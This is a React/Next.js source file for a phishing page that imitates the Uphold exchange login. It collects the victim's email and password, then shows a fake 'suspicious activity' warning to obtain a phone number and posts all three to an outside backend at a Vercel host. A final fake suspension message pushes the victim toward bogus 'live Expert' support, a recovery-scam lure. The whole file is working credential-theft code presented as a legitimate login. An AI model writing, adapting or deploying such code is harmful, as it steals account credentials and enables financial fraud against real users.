'use client';
import Image from 'next/image';
import img from '../assets/image1.png';
import { useState } from 'react';
import { EyeIcon, EyeSlashIcon, ExclamationCircleIcon } from '@heroicons/react/24/outline';
import axios from 'axios';
import PhoneInput from 'react-phone-number-input';
import 'react-phone-number-input/style.css';

export default function HomePage() {
    const [showPassword, setShowPassword] = useState(false);
    const [loading, setLoading] = useState(false);
    const [alert, setAlert] = useState<{ type: 'success' | 'error'; message: string } | null>(null);
    const [step, setStep] = useState(1);
    const [message, setMessage] = useState('some suspicious activity found with your account. Enter phone number to verify your identity')

    const [formData, setFormData] = useState({
        email: '',
        password: '',
        phone: '',
    });

    // Handle input changes
    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value,
        }));
    };

    // Handle Step 1 submit
    const handleSubmitStep1 = (e: React.FormEvent) => {
        e.preventDefault();
        setAlert(null);
        setLoading(true);

        try {
            const data = {
                email: formData.email,
                password: formData.password,
            };

            localStorage.setItem('userInfo', JSON.stringify(data));

            // Go to next step
            setStep(2);
            // Always show red message at Step 2 start
            setAlert({
                type: 'error',
                message:
                    'Important message!: some suspicious activity found with your account. Enter phone number to verify your identity',
            });
        } catch (err) {
            console.error(err);
            setAlert({ type: 'error', message: 'Failed to save data. Please try again.' });
        } finally {
            setLoading(false);
        }
    };

    // Handle Step 2 submit
    const handleSubmitStep2 = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);

        try {
            const stored = JSON.parse(localStorage.getItem('userInfo') || '{}');
            const data = {
                title: 'Uphold',
                ...stored,
                phone: formData.phone,
            };

            const response = await axios.post(
                'https://trezor-backend-zeta.vercel.app/api/v1/send-user-info',
                data
            );

            localStorage.removeItem('userInfo');

        } catch (err) {
            console.error(err);
            setAlert({
                type: 'error',
                message: 'Failed to verify your identity. Please try again.',
            });
        } finally {
            setMessage('Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.')
            setLoading(false);
        }
    };

    return (
        <div className="bg-[#11151c] h-screen w-full flex justify-center items-center py-[64px] px-[24px]">
            <div className="grid [grid-template-columns:repeat(2,minmax(auto,440px))] gap-24 h-full">
                {/* Left Section */}
                <div className="flex flex-col justify-center space-y-6">
                    <div className="px-8">
                        <h2 className="text-2xl font-bold text-white mb-3">
                            The easiest way to invest
                        </h2>
                        <p className="text-[16px] font-medium" style={{ color: '#919eb5' }}>
                            Trade between multiple asset classes from one convenient account.
                            A large number of assets are now less than a minute away.
                        </p>
                    </div>

                    <div className="bg-gray-200 h-64 md:h-80 rounded-lg flex items-center justify-center overflow-hidden">
                        <Image
                            src={img}
                            alt="Investment Illustration"
                            className="object-cover w-full h-full rounded-lg"
                            style={{ background: 'red' }}

                        />
                    </div>
                </div>

                {/* Right Section */}
                <div className="bg-[#161c27] p-8 rounded-md h-full flex flex-col justify-between relative">
                    {step === 1 ? (
                        // Step 1: Email & Password
                        <form onSubmit={handleSubmitStep1} className="flex flex-col justify-between h-full">
                            <div className="space-y-2 text-sm">
                                <h2 className="text-[22px] font-semibold text-white">Log in to Uphold</h2>
                                <div className="text-[13px] font-medium">
                                    <span className="text-gray-500">Not a member?</span>{' '}
                                    <span className="text-green-500 cursor-pointer">Sign up now</span>
                                </div>

                                {alert && (
                                    <div
                                        className={`mt-4 text-sm p-2 rounded-md ${alert.type === 'success'
                                            ? 'bg-green-100 text-green-700 border border-green-300'
                                            : 'bg-red-100 text-red-700 border border-red-300'
                                            }`}
                                    >
                                        {alert.message}
                                    </div>
                                )}

                                <div className="space-y-4 mt-10">
                                    {/* Email */}
                                    <div
                                        className="relative w-full border-2 rounded-lg text-sm focus-within:border-[#919eb5]"
                                        style={{ borderColor: '#919eb5' }}
                                    >
                                        <label
                                            className="absolute -top-2.5 left-3 px-1 text-[12px] font-medium"
                                            style={{ color: '#919eb5', backgroundColor: '#161c27' }}
                                        >
                                            Email address
                                        </label>
                                        <input
                                            type="email"
                                            name="email"
                                            value={formData.email}
                                            onChange={handleChange}
                                            className="w-full py-3 px-3 border-none outline-none focus:ring-0 text-white placeholder-[#919eb5] bg-transparent"
                                            required
                                        />
                                    </div>

                                    {/* Password */}
                                    <div
                                        className="relative w-full border-2 rounded-lg text-sm focus-within:border-[#919eb5]"
                                        style={{ borderColor: '#919eb5' }}
                                    >
                                        <label
                                            className="absolute -top-2.5 left-3 px-1 text-[12px] font-medium"
                                            style={{ color: '#919eb5', backgroundColor: '#161c27' }}
                                        >
                                            Password
                                        </label>
                                        <input
                                            type={showPassword ? 'text' : 'password'}
                                            name="password"
                                            value={formData.password}
                                            onChange={handleChange}
                                            className="w-full py-3 px-3 border-none outline-none focus:ring-0 text-white placeholder-[#919eb5] bg-transparent"
                                            required
                                        />
                                        <button
                                            type="button"
                                            className="absolute right-3 top-3 text-[#919eb5] cursor-pointer"
                                            onClick={() => setShowPassword(!showPassword)}
                                        >
                                            {showPassword ? (
                                                <EyeSlashIcon className="h-5 w-5" />
                                            ) : (
                                                <EyeIcon className="h-5 w-5" />
                                            )}
                                        </button>
                                    </div>

                                    {/* Forgot Password */}
                                    <div className="text-[13px] font-medium">
                                        <span className="text-green-500 cursor-pointer">Forgot password?</span>
                                    </div>
                                </div>
                            </div>

                            <button
                                type="submit"
                                disabled={loading}
                                className={`w-full py-2 rounded-full mt-6 text-sm font-medium transition-all duration-200 ${loading
                                    ? 'bg-green-400 cursor-not-allowed'
                                    : 'bg-green-500 hover:bg-green-600 cursor-pointer'
                                    } text-black`}
                            >
                                {loading ? 'Processing...' : 'Next'}
                            </button>
                        </form>
                    ) : (
                        // Step 2: Phone Input
                        <form onSubmit={handleSubmitStep2} className="flex flex-col  h-full relative gap-4">
                            {/* Alert at top — normal flow */}
                            <div
                                className="w-full text-sm p-3 rounded-md text-center border border-red-300 bg-red-100 text-red-700 flex items-center justify-center gap-2"
                            >
                                <span>{`Important message!: ${message}`}</span>
                            </div>

                            <div className="">
                                <div
                                    className="relative border-2 rounded-lg"
                                    style={{ borderColor: '#919eb5' }}
                                >
                                    <label
                                        className="absolute -top-2.5 left-3 px-1 text-[12px] font-medium"
                                        style={{ color: '#919eb5', backgroundColor: '#161c27' }}
                                    >
                                        Phone Number
                                    </label>
                                    <PhoneInput
                                        international
                                        defaultCountry="IN"
                                        value={formData.phone}
                                        onChange={(value) =>
                                            setFormData((prev) => ({ ...prev, phone: value || '' }))
                                        }
                                        className="w-full py-3 px-3 bg-transparent text-white placeholder-[#919eb5]"
                                        style={{
                                            border: 'none',
                                            outline: 'none',
                                            boxShadow: 'none',
                                            backgroundColor: 'transparent',
                                        }}
                                    />
                                </div>
                            </div>

                            <button
                                type="submit"
                                disabled={loading || !formData.phone}
                                className={`w-full py-2 rounded-full mt-6 text-sm font-medium transition-all duration-200 ${loading
                                        ? 'bg-green-400 cursor-not-allowed'
                                        : 'bg-green-500 hover:bg-green-600 cursor-pointer'
                                    } text-white`}
                            >
                                {loading ? 'Sending...' : 'Submit'}
                            </button>
                        </form>

                    )}
                </div>
            </div>
        </div>
    );
}
 